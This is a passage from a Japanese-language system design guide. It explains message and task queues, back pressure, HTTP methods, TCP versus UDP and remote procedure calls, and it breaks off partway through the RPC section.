\u30ef\u30fc\u30ab\u30fc\u304c\u30b8\u30e7\u30d6\u30ad\u30e5\u30fc\u304b\u3089\u53d7\u3051\u53d6\u3063\u3066\u3001\u51e6\u7406\u3092\u884c\u3044\u3001\u7d42\u4e86\u3057\u305f\u3089\u305d\u306e\u30b7\u30b0\u30ca\u30eb\u3092\u8fd4\u3057\u307e\u3059\u3002\n\n\u30e6\u30fc\u30b6\u30fc\u306e\u51e6\u7406\u304c\u6b62\u307e\u308b\u3053\u3068\u306f\u306a\u304f\u3001\u30b8\u30e7\u30d6\u306f\u30d0\u30c3\u30af\u30b0\u30e9\u30a6\u30f3\u30c9\u3067\u51e6\u7406\u3055\u308c\u307e\u3059\u3002\u3053\u306e\u9593\u306b\u3001\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u306f\u30aa\u30d7\u30b7\u30e7\u30f3\u3068\u3057\u3066\u3001\u30bf\u30b9\u30af\u304c\u5b8c\u4e86\u3057\u305f\u304b\u306e\u3088\u3046\u306b\u898b\u305b\u308b\u305f\u3081\u306b\u5c0f\u898f\u6a21\u306e\u51e6\u7406\u3092\u884c\u3044\u307e\u3059\u3002\u4f8b\u3048\u3070\u3001\u30c4\u30a4\u30fc\u30c8\u3092\u6295\u7a3f\u3059\u308b\u3068\u304d\u306b\u3001\u30c4\u30a4\u30fc\u30c8\u306f\u3059\u3050\u306b\u3042\u306a\u305f\u306e\u30bf\u30a4\u30e0\u30e9\u30a4\u30f3\u306b\u53cd\u6620\u3055\u308c\u305f\u3088\u3046\u306b\u898b\u3048\u307e\u3059\u304c\u3001\u305d\u306e\u30c4\u30a4\u30fc\u30c8\u304c\u5b9f\u969b\u306b\u5168\u3066\u306e\u30d5\u30a9\u30ed\u30ef\u30fc\u306b\u914d\u4fe1\u3055\u308c\u308b\u307e\u3067\u306b\u306f\u3082\u3046\u5c11\u3057\u6642\u9593\u304c\u304b\u304b\u3063\u3066\u3044\u308b\u3067\u3057\u3087\u3046\u3002\n\n**Redis** \u306f\u30b7\u30f3\u30d7\u30eb\u306a\u30e1\u30c3\u30bb\u30fc\u30b8\u4ef2\u4ecb\u3068\u3057\u3066\u306f\u3044\u3044\u3067\u3059\u304c\u3001\u30e1\u30c3\u30bb\u30fc\u30b8\u304c\u5931\u308f\u308c\u3066\u3057\u307e\u3046\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002\n\n**RabbitMQ** \u306f\u3088\u304f\u4f7f\u308f\u308c\u3066\u3044\u307e\u3059\u304c\u3001'AMQP'\u30d7\u30ed\u30c8\u30b3\u30eb\u306b\u5bfe\u5fdc\u3057\u3066\u3001\u81ea\u524d\u306e\u30ce\u30fc\u30c9\u3092\u7acb\u3066\u308b\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\u3002\n\n**Amazon SQS** \u3068\u3044\u3046\u9078\u629e\u80a2\u3082\u3042\u308a\u307e\u3059\u304c\u3001\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u304c\u9ad8\u304f\u3001\u30e1\u30c3\u30bb\u30fc\u30b8\u304c\u91cd\u8907\u3057\u3066\u914d\u4fe1\u3055\u308c\u3066\u3057\u307e\u3046\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002\n\n### \u30bf\u30b9\u30af\u30ad\u30e5\u30fc\n\n\u30bf\u30b9\u30af\u30ad\u30e5\u30fc\u306f\u30bf\u30b9\u30af\u3068\u305d\u306e\u95a2\u9023\u3059\u308b\u30c7\u30fc\u30bf\u3092\u53d7\u3051\u53d6\u308a\u3001\u51e6\u7406\u3057\u305f\u4e0a\u3067\u305d\u306e\u7d50\u679c\u3092\u8fd4\u3057\u307e\u3059\u3002\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u7ba1\u7406\u3092\u3067\u304d\u308b\u307b\u304b\u3001\u30d0\u30c3\u30af\u30b0\u30e9\u30a6\u30f3\u30c9\u3067\u3068\u3066\u3082\u91cd\u3044\u30b8\u30e7\u30d6\u3092\u3053\u306a\u3059\u3053\u3068\u3082\u3067\u304d\u307e\u3059\u3002\n\n**Celery** \u306f\u30b9\u30b1\u30b8\u30e5\u30fc\u30ea\u30f3\u30b0\u3068python\u306e\u30b5\u30dd\u30fc\u30c8\u304c\u3042\u308a\u307e\u3059\u3002\n\n### \u30d0\u30c3\u30af\u30d7\u30ec\u30c3\u30b7\u30e3\u30fc\n\n\u3082\u3057\u3001\u30ad\u30e5\u30fc\u304c\u62e1\u5927\u3057\u3059\u304e\u308b\u3068\u3001\u30e1\u30e2\u30ea\u30fc\u3088\u308a\u3082\u30ad\u30e5\u30fc\u306e\u65b9\u304c\u5927\u304d\u304f\u306a\u308a\u30ad\u30e3\u30c3\u30b7\u30e5\u30df\u30b9\u304c\u8d77\u3053\u308a\u3001\u30c7\u30a3\u30b9\u30af\u8aad\u307f\u51fa\u3057\u306b\u3064\u306a\u304c\u308a\u3001\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u304c\u4f4e\u4e0b\u3059\u308b\u3053\u3068\u306b\u3064\u306a\u304c\u308a\u307e\u3059\u3002[\u30d0\u30c3\u30af\u30d7\u30ec\u30c3\u30b7\u30e3\u30fc](http:\/\/mechanical-sympathy.blogspot.com\/2012\/05\/apply-back-pressure-when-overloaded.html)\u306f\u30ad\u30e5\u30fc\u30b5\u30a4\u30ba\u3092\u5236\u9650\u3059\u308b\u3053\u3068\u3067\u56de\u907f\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u3001\u9ad8\u3044\u30b9\u30eb\u30fc\u30d7\u30c3\u30c8\u3092\u78ba\u4fdd\u3057\u30ad\u30e5\u30fc\u306b\u3059\u3067\u306b\u3042\u308b\u30b8\u30e7\u30d6\u306b\u3064\u3044\u3066\u306e\u30ec\u30b9\u30dd\u30f3\u30b9\u6642\u9593\u3092\u77ed\u7e2e\u3067\u304d\u307e\u3059\u3002\u30ad\u30e5\u30fc\u304c\u3044\u3063\u3071\u3044\u306b\u306a\u308b\u3068\u3001\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u306f\u30b5\u30fc\u30d0\u30fc\u30d3\u30b8\u30fc\u3082\u3057\u304f\u306fHTTP 503\u3092\u30ec\u30b9\u30dd\u30f3\u30b9\u3068\u3057\u3066\u53d7\u3051\u53d6\u308a\u307e\u305f\u5f8c\u3067\u6642\u9593\u3092\u304a\u3044\u3066\u30a2\u30af\u30bb\u30b9\u3059\u308b\u3088\u3046\u306b\u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u53d7\u3051\u53d6\u308a\u307e\u3059\u3002\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u306f[exponential backoff](https:\/\/en.wikipedia.org\/wiki\/Exponential_backoff)\u306a\u3069\u306b\u3088\u3063\u3066\u5f8c\u307b\u3069\u518d\u5ea6\u6642\u9593\u3092\u7f6e\u3044\u3066\u30ea\u30af\u30a8\u30b9\u30c8\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\n\n### \u6b20\u70b9: \u975e\u540c\u671f\u51e6\u7406\n\n* \u30ad\u30e5\u30fc\u3092\u7528\u3044\u308b\u3053\u3068\u3067\u9045\u5ef6\u304c\u8d77\u3053\u308a\u3001\u8907\u96d1\u3055\u3082\u5897\u3059\u305f\u3081\u3001\u3042\u307e\u308a\u91cd\u304f\u306a\u3044\u8a08\u7b97\u51e6\u7406\u3084\u30ea\u30a2\u30eb\u30bf\u30a4\u30e0\u30ef\u30fc\u30af\u30d5\u30ed\u30fc\u306b\u304a\u3044\u3066\u306f\u540c\u671f\u51e6\u7406\u306e\u65b9\u304c\u3044\u3044\u3067\u3057\u3087\u3046\u3002\n\n### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8\n\n* [It's all a numbers game](https:\/\/www.youtube.com\/watch?v=1KRYH75wgy4)\n* [\u30aa\u30fc\u30d0\u30fc\u30ed\u30fc\u30c9\u3057\u305f\u6642\u306b\u30d0\u30c3\u30af\u30d7\u30ec\u30c3\u30b7\u30e3\u30fc\u3092\u9069\u7528\u3059\u308b](http:\/\/mechanical-sympathy.blogspot.com\/2012\/05\/apply-back-pressure-when-overloaded.html)\n* [Little's law](https:\/\/en.wikipedia.org\/wiki\/Little%27s_law)\n* [\u30e1\u30c3\u30bb\u30fc\u30b8\u30ad\u30e5\u30fc\u3068\u30bf\u30b9\u30af\u30ad\u30e5\u30fc\u306e\u9055\u3044\u3068\u306f\uff1f](https:\/\/www.quora.com\/What-is-the-difference-between-a-message-queue-and-a-task-queue-Why-would-a-task-queue-require-a-message-broker-like-RabbitMQ-Redis-Celery-or-IronMQ-to-function)\n\n## \u901a\u4fe1\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/5KeocQs.jpg\"\/>\n  <br\/>\n  <i><a href=http:\/\/www.escotal.com\/osilayer.html>Source: OSI 7 layer model<\/a><\/i>\n<\/p>\n\n### Hypertext transfer protocol (HTTP)\n\nHTTP \u306f\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u3068\u30b5\u30fc\u30d0\u30fc\u9593\u3067\u306e\u30c7\u30fc\u30bf\u3092\u30a8\u30f3\u30b3\u30fc\u30c9\u3057\u3066\u8ee2\u9001\u3059\u308b\u305f\u3081\u306e\u624b\u6cd5\u3067\u3059\u3002\u30ea\u30af\u30a8\u30b9\u30c8\u30fb\u30ec\u30b9\u30dd\u30f3\u30b9\u306b\u95a2\u308f\u308b\u30d7\u30ed\u30c8\u30b3\u30eb\u3067\u3059\u3002\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u304c\u30ea\u30af\u30a8\u30b9\u30c8\u3092\u30b5\u30fc\u30d0\u30fc\u306b\u6295\u3052\u3001\u30b5\u30fc\u30d0\u30fc\u304c\u30ea\u30af\u30a8\u30b9\u30c8\u306b\u95a2\u4fc2\u3059\u308b\u30b3\u30f3\u30c6\u30f3\u30c4\u3068\u5b8c\u4e86\u30b9\u30c6\u30fc\u30bf\u30b9\u60c5\u5831\u3092\u30ec\u30b9\u30dd\u30f3\u30b9\u3068\u3057\u3066\u8fd4\u3057\u307e\u3059\u3002HTTP\u306f\u81ea\u5df1\u5b8c\u7d50\u3059\u308b\u306e\u3067\u3001\u9593\u306b\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u3001\u30ad\u30e3\u30c3\u30b7\u30e5\u3001\u30a8\u30f3\u30af\u30ea\u30d7\u30b7\u30e7\u30f3\u3001\u5727\u7e2e\u306a\u3069\u306e\u3069\u3093\u306a\u4e2d\u9593\u30eb\u30fc\u30bf\u30fc\u304c\u5165\u3063\u3066\u3082\u52d5\u304f\u3088\u3046\u306b\u3067\u304d\u3066\u3044\u307e\u3059\u3002\n\n\u57fa\u672c\u7684\u306aHTTP\u30ea\u30af\u30a8\u30b9\u30c8\u306fHTTP\u52d5\u8a5e(\u30e1\u30bd\u30c3\u30c9)\u3068\u30ea\u30bd\u30fc\u30b9(\u30a8\u30f3\u30c9\u30dd\u30a4\u30f3\u30c8)\u3067\u6210\u308a\u7acb\u3063\u3066\u3044\u307e\u3059\u3002\u4ee5\u4e0b\u304c\u3088\u304f\u3042\u308bHTTP\u52d5\u8a5e\u3067\u3059\u3002:\n\n| \u52d5\u8a5e | \u8a73\u7d30 | \u51aa\u7b49\u6027* | \u30bb\u30fc\u30d5 | \u30ad\u30e3\u30c3\u30b7\u30e5\u3067\u304d\u308b\u304b |\n|---|---|---|---|---|\n| GET | \u30ea\u30bd\u30fc\u30b9\u3092\u8aad\u307f\u53d6\u308b | Yes | Yes | Yes |\n| POST | \u30ea\u30bd\u30fc\u30b9\u3092\u4f5c\u6210\u3059\u308b\u3082\u3057\u304f\u306f\u30c7\u30fc\u30bf\u3092\u51e6\u7406\u3059\u308b\u30c8\u30ea\u30ac\u30fc | No | No | Yes \u30ec\u30b9\u30dd\u30f3\u30b9\u304c\u65b0\u3057\u3044\u60c5\u5831\u3092\u542b\u3080\u5834\u5408 |\n| PUT | \u30ea\u30bd\u30fc\u30b9\u3092\u4f5c\u6210\u3082\u3057\u304f\u306f\u5165\u308c\u66ff\u3048\u308b | Yes | No | No |\n| PATCH | \u30ea\u30bd\u30fc\u30b9\u3092\u90e8\u5206\u7684\u306b\u66f4\u65b0\u3059\u308b | No | No | Yes \u30ec\u30b9\u30dd\u30f3\u30b9\u304c\u65b0\u3057\u3044\u60c5\u5831\u3092\u542b\u3080\u5834\u5408 |\n| DELETE | \u30ea\u30bd\u30fc\u30b9\u3092\u524a\u9664\u3059\u308b | Yes | No | No |\n\n*\u4f55\u5ea6\u547c\u3093\u3067\u3082\u540c\u3058\u7d50\u679c\u304c\u8fd4\u3063\u3066\u304f\u308b\u3053\u3068*\n\nHTTP\u306f**TCP** \u3084 **UDP** \u306a\u3069\u306e\u4f4e\u7d1a\u30d7\u30ed\u30c8\u30b3\u30eb\u306b\u4f9d\u5b58\u3057\u3066\u3044\u308b\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u30ec\u30a4\u30e4\u30fc\u306e\u30d7\u30ed\u30c8\u30b3\u30eb\u3067\u3042\u308b\u3002\n\n#### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8: HTTP\n\n* [HTTP\u3063\u3066\u306a\u306b?](https:\/\/www.nginx.com\/resources\/glossary\/http\/)\n* [HTTP \u3068 TCP\u306e\u9055\u3044](https:\/\/www.quora.com\/What-is-the-difference-between-HTTP-protocol-and-TCP-protocol)\n* [PUT \u3068 PATCH\u306e\u9055\u3044](https:\/\/laracasts.com\/discuss\/channels\/general-discussion\/whats-the-differences-between-put-and-patch?page=1)\n\n### \u4f1d\u9001\u5236\u5fa1\u30d7\u30ed\u30c8\u30b3\u30eb (TCP)\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/JdAsdvG.jpg\"\/>\n  <br\/>\n  <i><a href=http:\/\/www.wildbunny.co.uk\/blog\/2012\/10\/09\/how-to-make-a-multi-player-game-part-1\/>Source: How to make a multiplayer game<\/a><\/i>\n<\/p>\n\nTCP\u306f[IP network](https:\/\/en.wikipedia.org\/wiki\/Internet_Protocol)\u306e\u4e0a\u3067\u6210\u308a\u7acb\u3064\u63a5\u7d9a\u30d7\u30ed\u30c8\u30b3\u30eb\u3067\u3059\u3002\u63a5\u7d9a\u306f[handshake](https:\/\/en.wikipedia.org\/wiki\/Handshaking)\u306b\u3088\u3063\u3066\u958b\u59cb\u3001\u89e3\u9664\u3055\u308c\u307e\u3059\u3002\u5168\u3066\u306e\u9001\u4fe1\u3055\u308c\u305f\u30d1\u30b1\u30c3\u30c8\u306f\u6b20\u640d\u306a\u3057\u3067\u9001\u4fe1\u5148\u306b\u9001\u4fe1\u3055\u308c\u305f\u9806\u756a\u3067\u5230\u9054\u3059\u308b\u3088\u3046\u306b\u4ee5\u4e0b\u306e\u65b9\u6cd5\u3067\u4fdd\u8a3c\u3055\u308c\u3066\u3044\u307e\u3059:\n\n* \u30b7\u30fc\u30b1\u30f3\u30b9\u756a\u53f7\u3068[checksum fields](https:\/\/en.wikipedia.org\/wiki\/Transmission_Control_Protocol#Checksum_computation)\u304c\u5168\u3066\u306e\u30d1\u30b1\u30c3\u30c8\u306b\u7528\u610f\u3055\u308c\u3066\u3044\u308b\n* [Acknowledgement](https:\/\/en.wikipedia.org\/wiki\/Acknowledgement_(data_networks))\u30d1\u30b1\u30c3\u30c8\u3068\u81ea\u52d5\u518d\u9001\u4fe1\n\n\u3082\u3057\u9001\u4fe1\u8005\u304c\u6b63\u3057\u3044\u30ec\u30b9\u30dd\u30f3\u30b9\u3092\u53d7\u3051\u53d6\u3089\u306a\u304b\u3063\u305f\u3068\u304d\u3001\u30d1\u30b1\u30c3\u30c8\u3092\u518d\u9001\u4fe1\u3057\u307e\u3059\u3002\u8907\u6570\u306e\u30bf\u30a4\u30e0\u30a2\u30a6\u30c8\u304c\u3042\u3063\u305f\u3068\u304d\u3001\u63a5\u7d9a\u306f\u89e3\u9664\u3055\u308c\u307e\u3059\u3002TCP \u306f[\u30d5\u30ed\u30fc\u5236\u5fa1](https:\/\/en.wikipedia.org\/wiki\/Flow_control_(data)) \u3068 [\u8f3b\u8f33\u5236\u5fa1](https:\/\/en.wikipedia.org\/wiki\/Network_congestion#Congestion_control)\u3082\u5b9f\u88c5\u3057\u3066\u3044\u307e\u3059\u3002\u3053\u308c\u3089\u306e\u6a5f\u80fd\u306b\u3088\u3063\u3066\u901f\u5ea6\u306f\u4f4e\u4e0b\u3057\u3001\u4e00\u822c\u7684\u306bUDP\u3088\u308a\u3082\u975e\u52b9\u7387\u306a\u8ee2\u9001\u624b\u6bb5\u306b\u306a\u3063\u3066\u3044\u307e\u3059\u3002\n\n\u30cf\u30a4\u30b9\u30eb\u30fc\u30d7\u30c3\u30c8\u3092\u5b9f\u73fe\u3059\u308b\u305f\u3081\u306b\u3001\u30a6\u30a7\u30d6\u30b5\u30fc\u30d0\u30fc\u306f\u304b\u306a\u308a\u5927\u304d\u306a\u6570\u306eTCP\u63a5\u7d9a\u3092\u958b\u3044\u3066\u304a\u304f\u3053\u3068\u304c\u3042\u308a\u3001\u305d\u306e\u3053\u3068\u3067\u30e1\u30e2\u30ea\u30fc\u4f7f\u7528\u304c\u5727\u8feb\u3055\u308c\u307e\u3059\u3002\u30a6\u30a7\u30d6\u30b5\u30fc\u30d0\u30b9\u30ec\u30c3\u30c9\u3068\u4f8b\u3048\u3070[memcached](#memcached) \u30b5\u30fc\u30d0\u30fc\u306e\u9593\u3067\u591a\u6570\u306e\u30b3\u30cd\u30af\u30b7\u30e7\u30f3\u3092\u4fdd\u3063\u3066\u304a\u304f\u3053\u3068\u306f\u9ad8\u304f\u3064\u304f\u304b\u3082\u3057\u308c\u307e\u305b\u3093\u3002\u53ef\u80fd\u306a\u3068\u3053\u308d\u3067\u306fUDP\u306b\u5207\u308a\u66ff\u3048\u308b\u3060\u3051\u3067\u306a\u304f[\u30b3\u30cd\u30af\u30b7\u30e7\u30f3\u30d7\u30fc\u30ea\u30f3\u30b0](https:\/\/en.wikipedia.org\/wiki\/Connection_pool)\u306a\u3069\u3082\u5f79\u7acb\u3064\u304b\u3082\u3057\u308c\u307e\u305b\u3093\u3002\n\nTCP\u306f\u9ad8\u3044\u4f9d\u5b58\u6027\u3092\u8981\u3057\u3001\u6642\u9593\u5236\u7d04\u304c\u53b3\u3057\u304f\u306a\u3044\u3082\u306e\u306b\u9069\u3057\u3066\u3044\u308b\u3067\u3057\u3087\u3046\u3002\u30a6\u30a7\u30d6\u30b5\u30fc\u30d0\u30fc\u3001\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u60c5\u5831\u3001SMTP\u3001FTP\u3084SSH\u306a\u3069\u306e\u4f8b\u306b\u9069\u7528\u3055\u308c\u307e\u3059\u3002\n\n\u4ee5\u4e0b\u306e\u6642\u306bUDP\u3088\u308a\u3082TCP\u3092\u4f7f\u3046\u3068\u3044\u3044\u3067\u3057\u3087\u3046:\n\n* \u5168\u3066\u306e\u30c7\u30fc\u30bf\u304c\u6b20\u640d\u3059\u308b\u3053\u3068\u306a\u3057\u306b\u5c4a\u3044\u3066\u307b\u3057\u3044\n* \u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u30b9\u30eb\u30fc\u30d7\u30c3\u30c8\u306e\u6700\u9069\u306a\u81ea\u52d5\u63a8\u6e2c\u3092\u3057\u3066\u30aa\u30da\u30ec\u30fc\u30b7\u30e7\u30f3\u3057\u305f\u3044\n\n### \u30e6\u30fc\u30b6\u30c7\u30fc\u30bf\u30b0\u30e9\u30e0\u30d7\u30ed\u30c8\u30b3\u30eb (UDP)\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/yzDrJtA.jpg\"\/>\n  <br\/>\n  <i><a href=http:\/\/www.wildbunny.co.uk\/blog\/2012\/10\/09\/how-to-make-a-multi-player-game-part-1\/>Source: How to make a multiplayer game<\/a><\/i>\n<\/p>\n\nUDP\u306f\u30b3\u30cd\u30af\u30b7\u30e7\u30f3\u30ec\u30b9\u3067\u3059\u3002\u30c7\u30fc\u30bf\u30b0\u30e9\u30e0\uff08\u30d1\u30b1\u30c3\u30c8\u306e\u3088\u3046\u306a\u3082\u306e\uff09\u306f\u30c7\u30fc\u30bf\u30b0\u30e9\u30e0\u30ec\u30d9\u30eb\u3067\u306e\u4fdd\u8a3c\u3057\u304b\u3055\u308c\u307e\u305b\u3093\u3002\u30c7\u30fc\u30bf\u30b0\u30e9\u30e0\u306f\u9806\u4e0d\u540c\u3067\u53d7\u3051\u53d6\u308a\u5148\u306b\u5230\u7740\u3057\u305f\u308a\u305d\u3082\u305d\u3082\u7740\u304b\u306a\u304b\u3063\u305f\u308a\u3057\u307e\u3059\u3002UDP\u306f\u8f3b\u8f33\u5236\u5fa1\u3092\u30b5\u30dd\u30fc\u30c8\u3057\u307e\u305b\u3093\u3002TCP\u306b\u304a\u3044\u3066\u306f\u30b5\u30dd\u30fc\u30c8\u3055\u308c\u3066\u3044\u308b\u3053\u308c\u3089\u306e\u4fdd\u8a3c\u304c\u306a\u3044\u305f\u3081\u3001UDP\u306f\u4e00\u822c\u7684\u306b\u3001TCP\u3088\u308a\u3082\u52b9\u7387\u7684\u3067\u3059\u3002\n\nUDP\u306f\u30b5\u30d6\u30cd\u30c3\u30c8\u4e0a\u306e\u3059\u3079\u3066\u306e\u6a5f\u5668\u306b\u30c7\u30fc\u30bf\u30b0\u30e9\u30e0\u3092\u9001\u4fe1\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\u3053\u308c\u306f[DHCP](https:\/\/en.wikipedia.org\/wiki\/Dynamic_Host_Configuration_Protocol) \u306b\u304a\u3044\u3066\u5f79\u306b\u7acb\u3061\u307e\u3059\u3002\u3068\u3044\u3046\u306e\u3082\u3001\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u306f\u307e\u3060IP\u30a2\u30c9\u30ec\u30b9\u3092\u53d6\u5f97\u3057\u3066\u3044\u306a\u3044\u306e\u3067\u3001IP\u30a2\u30c9\u30ec\u30b9\u3092\u5fc5\u8981\u3068\u3059\u308bTCP\u306b\u3088\u308b\u30b9\u30c8\u30ea\u30fc\u30e0\u304c\u3067\u304d\u306a\u3044\u304b\u3089\u3067\u3059\u3002\n\nUDP\u306f\u4fe1\u983c\u6027\u306e\u9762\u3067\u306f\u52a3\u308a\u307e\u3059\u304c\u3001VoIP\u3001\u30d3\u30c7\u30aa\u30c1\u30e3\u30c3\u30c8\u3001\u30b9\u30c8\u30ea\u30fc\u30df\u30f3\u30b0\u3084\u540c\u6642\u901a\u4fe1\u30de\u30eb\u30c1\u30d7\u30ec\u30a4\u30e4\u30fc\u30b2\u30fc\u30e0\u306a\u3069\u306e\u30ea\u30a2\u30eb\u30bf\u30a4\u30e0\u6027\u304c\u91cd\u8996\u3055\u308c\u308b\u6642\u306b\u306f\u3068\u3066\u3082\u52b9\u679c\u7684\u3067\u3059\u3002\n\nTCP\u3088\u308a\u3082UDP\u3092\u4f7f\u3046\u306e\u306f:\n\n* \u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u3092\u6700\u4f4e\u9650\u306b\u6291\u3048\u305f\u3044\u6642\n* \u30c7\u30fc\u30bf\u6b20\u640d\u3088\u308a\u3082\u3001\u30c7\u30fc\u30bf\u9045\u5ef6\u3092\u91cd\u8996\u3059\u308b\u3068\u304d\n* \u30a8\u30e9\u30fc\u4fee\u6b63\u3092\u81ea\u524d\u3067\u5b9f\u88c5\u3057\u305f\u3044\u3068\u304d\n\n#### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8: TCP \u3068 UDP\n\n* [\u30b2\u30fc\u30e0\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u306e\u305f\u3081\u306e\u30cd\u30c3\u30c8\u30ef\u30fc\u30af](http:\/\/gafferongames.com\/networking-for-game-programmers\/udp-vs-tcp\/)\n* [TCP \u3068 UDP \u30d7\u30ed\u30c8\u30b3\u30eb\u306e\u4e3b\u306a\u9055\u3044](http:\/\/www.cyberciti.biz\/faq\/key-differences-between-tcp-and-udp-protocols\/)\n* [TCP \u3068 UDP\u306e\u9055\u3044](http:\/\/stackoverflow.com\/questions\/5970383\/difference-between-tcp-and-udp)\n* [Transmission control protocol](https:\/\/en.wikipedia.org\/wiki\/Transmission_Control_Protocol)\n* [User datagram protocol](https:\/\/en.wikipedia.org\/wiki\/User_Datagram_Protocol)\n* [Facebook\u306e\u30e1\u30e0\u30ad\u30e3\u30c3\u30b7\u30e5\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0](http:\/\/www.cs.bu.edu\/~jappavoo\/jappavoo.github.com\/451\/papers\/memcache-fb.pdf)\n\n### \u9060\u9694\u624b\u7d9a\u547c\u51fa (RPC)\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/iF4Mkb5.png\"\/>\n  <br\/>\n  <i><a href=http:\/\/www.puncsky.com\/blog\/2016-02-13-crack-the-system-design-interview>Source: Crack the system design interview<\/a><\/i>\n<\/p>\n\nRPC\u3067\u306f\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u304c\u30ea\u30e2\u30fc\u30c8\u30b5\u30fc\u30d0\u30fc\u306a\u3069\u306e\u7570\u306a\u308b\u30a2\u30c9\u30ec\u30b9\u7a7a\u9593\u3067\u30d7\u30ed\u30b7\u30fc\u30b8\u30e3\u30fc\u304c\u51e6\u7406\u3055\u308c\u308b\u3088\u3046\u306b\u3057\u307e\u3059\u3002\u30d7\u30ed\u30b7\u30fc\u30b8\u30e3\u30fc\u306f\u30ed\u30fc\u30ab\u30eb\u3067\u306e\u30b3\u30fc\u30eb\u306e\u3088\u3046\u306b\u3001\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u304b\u3089\u30b5\u30fc\u30d0\u30fc\u306b\u3069\u306e\u3088\u3046\u306b\u901a\u4fe1\u3059\u308b\u304b\u3068\u3044\u3046\u8a73\u7d30\u3092\u7701\u3044\u305f\u72b6\u614b\u3067\u30b3\u30fc\u30c9\u304c\u66f8\u304b\u308c\u307e\u3059\u3002\u30ea\u30e2\u30fc\u30c8\u306e\u30b3\u30fc\u30eb\u306f\u666e\u901a\u3001\u30ed\u30fc\u30ab\u30eb\u306e\u30b3\u30fc\u30eb\u3088\u308a\u3082\u9045\u304f\u3001\u4fe1\u983c\u6027\u306b\u6b20\u3051\u308b\u305f\u3081\u3001RPC\u30b3\u30fc\u30eb\u3092\u30ed\u30fc\u30ab\u30eb\u30b3\u30fc\u30eb\u3068\u533a\u5225\u3055\u305b\u3066\u304a\u304f\u3053\u3068\u304c\u597d\u307e\u3057\u3044\u3067\u3057\u3087\u3046\u3002\u4eba\u6c17\u306eRPC\u30d5\u30ec\u30fc\u30e0\u30ef\u30fc\u30af\u306f\u4ee5\u4e0b\u3067\u3059\u3002[Protobuf](https:\/\/developers.google.com\/protocol-buffers\/)\u3001 [Thrift](https:\/\/thrift.apache.org\/)\u3001[Avro](https:\/\/avro.apache.org\/docs\/current\/)\n\nRPC \u306f \u30ea\u30af\u30a8\u30b9\u30c8\u30ec\u30b9\u30dd\u30f3\u30b9\u30d7\u30ed\u30c8\u30b3\u30eb:\n\n* **\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u30d7\u30ed\u30b0\u30e9\u30e0** - \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u30b9\u30bf\u30d6\u30d7\u30ed\u30b7\u30fc\u30b8\u30e3\u30fc\u3092\u547c\u3073\u51fa\u3057\u307e\u3059\u3002\u30d1\u30e9\u30e1\u30fc\u30bf\u306f\u30ed\u30fc\u30ab\u30eb\u3067\u306e\u30d7\u30ed\u30b7\u30fc\u30b8\u30e3\u30fc\u30b3\u30fc\u30eb\u306e\u3088\u3046\u306b\u30b9\u30bf\u30c3\u30af\u3078\u3068\u30d7\u30c3\u30b7\u30e5\u3055\u308c\u3066\u3044\u304d\u307e\u3059\u3002\n* **\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u30b9\u30bf\u30d6\u30d7\u30ed\u30b7\u30fc\u30b8\u30e3\u30fc** - \u30d7\u30ed\u30b7\u30fc\u30b8\u30e3ID\u3068\u30a2\u30fc\u30ae\u30e5\u30e1\u30f3\u30c8\u3092\u30d1\u30c3\u30af\u3057\u3066\u30ea\u30af\u30a8\u30b9\u30c8\u30e1\u30c3\u30bb\u30fc\u30b8\u306b\u3057\u307e\u3059\u3002\n* **\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u901a\u4fe1\u30e2\u30b8\u30e5\u30fc\u30eb** - OS\u304c\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u304b\u3089\u30b5\u30fc\u30d0\u30fc\u3078\u3068\u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u9001\u308a\u307e\u3059\u3002\n* **\u30b5\u30fc\u30d0\u30fc\u901a\u4fe1\u30e2\u30b8\u30e5\u30fc\u30eb** - OS\u304c\u53d7\u3051\u53d6\u3063\u305f\u30d1\u30b1\u30c3\u30c8\u3092\u30b5\u30fc\u30d0\u30fc\u30b9\u30bf\u30d6\u30d7\u30ed\u30b7\u30fc\u30b8\u30e3\u30fc\u306b\u53d7\u3051\u6e21\u3057\u307e\u3059\u3002\n* **\u30b5\u30fc\u30d0\u30fc\u30b9\u30bf\u30d6\u30d7\u30ed\u30b7\u30fc\u30b8\u30e3\u30fc** -  